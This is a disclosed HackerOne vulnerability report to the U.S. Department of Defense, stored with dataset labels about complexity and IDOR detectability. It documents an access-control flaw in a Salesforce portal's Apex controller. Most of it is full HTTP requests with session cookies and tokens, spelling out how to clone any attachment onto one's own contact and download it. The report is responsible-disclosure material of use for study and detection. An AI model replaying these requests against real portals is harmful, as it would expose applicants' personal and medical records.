{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "oxylis ",
  "title": "Applicant security exam Attachments/Documents accessible through an IDOR/BAC on the custom Apex controller on https://\u2588\u2588\u2588\u2588\u2588.mil ",
  "content": "\nGreetings DoD team,\nI've uncovered a highly dangerous IDOR on the \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 portal.\nAn attacker can switch the ownership of any Attachment record submitted through the portal and access the files. These contain highly sensitive information as they include all materials/documentation submitted as part of the vetting procedures prior to visiting the \u2588\u2588\u2588\u2588\u2588, e.g. personal medical records. Potentially this might include internal attachments as well.\nAn attacker is able to exploit the following chain:\nGenerate/enumerate a list of Salesforce Attachment Id's. These are highly predictable: example methodology/script here: https://blog.hypn.za.net/2022/11/12/Hacking-Salesforce-backed-WebApps/.\nPlug the generated list of Id's into the broken Apex controller (apex://ExAM.FileUploadController/ACTION$cloneAttachment), clone any Attachment record within the CRM and link it to a record they own (e.g. their own Contact). This gives read access to the record.\nDownload the newly-linked Attachment as their own via a servlet/servlet.FileDownload?file=* request.\nIMPORTANT NOTE: unfortunately during testing inadvertent access was gained to a confidential record (https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/Portal\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/servlet/servlet.FileDownload?file=00PRw000000MaT3MAK). Please remove the link to the test Contact as a matter of urgency. Apologies!\nImpact\nHigh-impact sensitive data leak.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588.mil\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nSteps to reproduce/POC\nCreate a new \u2588\u2588\u2588\u2588\u2588\u2588\u2588 request: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/Portal\u2588\u2588\u2588\u2588\u2588\u2588/s/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588-creation\nAfter submitting the form, verify the account by following the link received in email (Welcome to Your \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 Reservation Portal My\u2588\u2588\u2588\u2588s Account...)\nAfter changing the password and logging into \u2588\u2588\u2588\u2588\u2588\u2588.mil/Portal\u2588\u2588\u2588\u2588/s/, find any POST request with aura.token present in the HTTP traffic, e.g:\nCode 2.77 KiB\n1POST /Portal\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2\n2Host: \u2588\u2588\u2588\u2588\u2588.mil\n3Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1\n4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\n5Accept: */*\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate, br\n8Referer: https://\u2588\u2588\u2588\u2588\u2588.mil/Portal\u2588\u2588\u2588\u2588\u2588/s/\n9X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb\n10X-Sfdc-Request-Id: 1650000000ce00391b\n11X-Sfdc-Page-Cache: 05da72b5c160b86c\n12Content-Type: application/x-www-form-urlencoded;charset=UTF-8\n13X-B3-Traceid: bb38cda3039f713b\n14X-B3-Spanid: 2e48fc5f161b8aa4\n15X-B3-Sampled: 0\n16Content-Length: 1310\n17Origin: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil\n18Sec-Fetch-Dest: empty\n19Sec-Fetch-Mode: cors\n20Sec-Fetch-Site: same-origin\n21Te: trailers\n22\n23message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2294%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.comm.runtime.components.aura.components.siteforce.controller.PubliclyCacheableAttributeLoaderController%2FACTION%24getComponentAttributes%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fsiteforce%3ApageLoader%22%2C%22params%22%3A%7B%22viewOrThemeLayoutId%22%3A%22c2a69af8-e08e-4cc8-a677-d55b0ca0fa94%22%2C%22publishedChangelistNum%22%3A91%2C%22audienceKey%22%3A%22ClyOkxQ47tauZ_s9udPOFA%22%7D%2C%22version%22%3A%2262.0%22%2C%22storable%22%3Atrue%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal\u2588\u2588\u2588\u2588\u2588\u2588%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D\nSend the request to Repeater, modify as below and send. This will pull some info from your own Contact record. Save the Contact Id (003Rw000002SJcsIAG in my case)\nCode 2.58 KiB\n1POST /Portal\u2588\u2588\u2588\u2588\u2588/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2\n2Host: \u2588\u2588\u2588\u2588\u2588.mil\n3Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1\n4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\n5Accept: */*\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate, br\n8Referer: https://\u2588\u2588\u2588\u2588\u2588.mil/Portal\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/s/\n9X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb\n10X-Sfdc-Request-Id: 1650000000ce00391b\n11X-Sfdc-Page-Cache: 05da72b5c160b86c\n12Content-Type: application/x-www-form-urlencoded;charset=UTF-8\n13X-B3-Traceid: bb38cda3039f713b\n14X-B3-Spanid: 2e48fc5f161b8aa4\n15X-B3-Sampled: 0\n16Content-Length: 1115\n17Origin: https://\u2588\u2588\u2588\u2588\u2588\u2588.mil\n18Sec-Fetch-Dest: empty\n19Sec-Fetch-Mode: cors\n20Sec-Fetch-Site: same-origin\n21Te: trailers\n22\n23message={\"actions\":[{\"id\":\"123;a\",\"descriptor\":\"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{\"entityNameOrId\":\"Contact\",\"layoutType\":\"FULL\",\"pageSize\":2000,\"currentPage\":0,\"useTimeout\":false,\"getCount\":false,\"enableRowActions\":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nModify the request again as below, setting the value of parentId as as your Contact Id extracted in previous step and attachmentId as 00PRw000000MaT3MAK:\nCode 2.47 KiB\n1POST /Portal\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2\n2Host: \u2588\u2588\u2588\u2588\u2588.mil\n3Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1\n4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\n5Accept: */*\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate, br\n8Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/Portal\u2588\u2588\u2588\u2588\u2588\u2588\u2588/s/\n9X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb\n10X-Sfdc-Request-Id: 1650000000ce00391b\n11X-Sfdc-Page-Cache: 05da72b5c160b86c\n12Content-Type: application/x-www-form-urlencoded;charset=UTF-8\n13X-B3-Traceid: bb38cda3039f713b\n14X-B3-Spanid: 2e48fc5f161b8aa4\n15X-B3-Sampled: 0\n16Content-Length: 999\n17Origin: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil\n18Sec-Fetch-Dest: empty\n19Sec-Fetch-Mode: cors\n20Sec-Fetch-Site: same-origin\n21Te: trailers\n22\n23message={\"actions\":[{\"id\":\"20;a\",\"descriptor\":\"apex://ExAM.FileUploadController/ACTION$cloneAttachment\",\"callingDescriptor\":\"markup://ExAM:AssessmentViewer\",\"params\":{\"attachmentId\":\"00PRw000000MaT3MAK\",\"parentId\":\"003Rw000002SJcsIAG\"},\"version\":null}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D\n\u2588\u2588\u2588\u2588\u2588\nModify request again and send, this time calling all accessible Attachment records. Note that a new file has just been cloned/created, copy the Id: 00PRw000000MbSLMA0.\nCode 2.58 KiB\n1POST /Portal\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588.mil\n3Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1\n4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\n5Accept: */*\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate, br\n8Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/Portal\u2588\u2588\u2588\u2588\u2588\u2588/s/\n9X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb\n10X-Sfdc-Request-Id: 1650000000ce00391b\n11X-Sfdc-Page-Cache: 05da72b5c160b86c\n12Content-Type: application/x-www-form-urlencoded;charset=UTF-8\n13X-B3-Traceid: bb38cda3039f713b\n14X-B3-Spanid: 2e48fc5f161b8aa4\n15X-B3-Sampled: 0\n16Content-Length: 1118\n17Origin: https://\u2588\u2588\u2588.mil\n18Sec-Fetch-Dest: empty\n19Sec-Fetch-Mode: cors\n20Sec-Fetch-Site: same-origin\n21Te: trailers\n22\n23message={\"actions\":[{\"id\":\"123;a\",\"descriptor\":\"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{\"entityNameOrId\":\"Attachment\",\"layoutType\":\"FULL\",\"pageSize\":2000,\"currentPage\":0,\"useTimeout\":false,\"getCount\":false,\"enableRowActions\":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nInsert the ID into URL as below (same session) and verify that file is accessible from your account:\nhttps://\u2588\u2588\u2588\u2588\u2588.mil/Portal\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/servlet/servlet.FileDownload?file=00PRw000000MbSLMA0\nNotes\nTo ease testing on your side, I am also attaching a list of Attachment Id's that I generated using the method mentioned in the beginning of the report.\nHope you find this report helpful - look forward to your feedback.\nSuggested Mitigation/Remediation Actions\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Improper Access Control - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1739411700,
  "report_url": "https://hackerone.com/reports/2950536",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Generate/enumerate a list of Salesforce Attachment Id's using predictable patterns"
    ],
    [
      2,
      "Use the broken Apex controller (apex://ExAM.FileUploadController/ACTION$cloneAttachment) to clone any Attachment record and link it to a record owned by the attacker"
    ],
    [
      3,
      "Download the newly-linked Attachment via a servlet/servlet.FileDownload?file=* request"
    ]
  ],
  "vuln_description": "An Insecure Direct Object Reference (IDOR) vulnerability in a custom Apex controller allows an attacker to switch the ownership of any Attachment record submitted through the portal and access sensitive files, including personal medical records and other confidential documents.",
  "reason": "The vulnerability involves multiple components (ID enumeration, Apex controller manipulation, and file access via servlet) and requires understanding of Salesforce ID patterns and custom controller behavior. However, the steps are somewhat linear once the initial ID generation method is known.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": true,
  "authnz_byppass_detectable": true,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves an IDOR where an attacker can manipulate attachment IDs and ownership through authenticated requests. The methodology described involves testing (user_session, action, resource_id) tuples by swapping user sessions and resource IDs, which directly applies to this scenario. The attacker's actions of generating predictable attachment IDs, cloning them to their own records, and accessing the files through authenticated requests fall under the IDOR detection method (test e).",
    "is_detectable": true
  }
}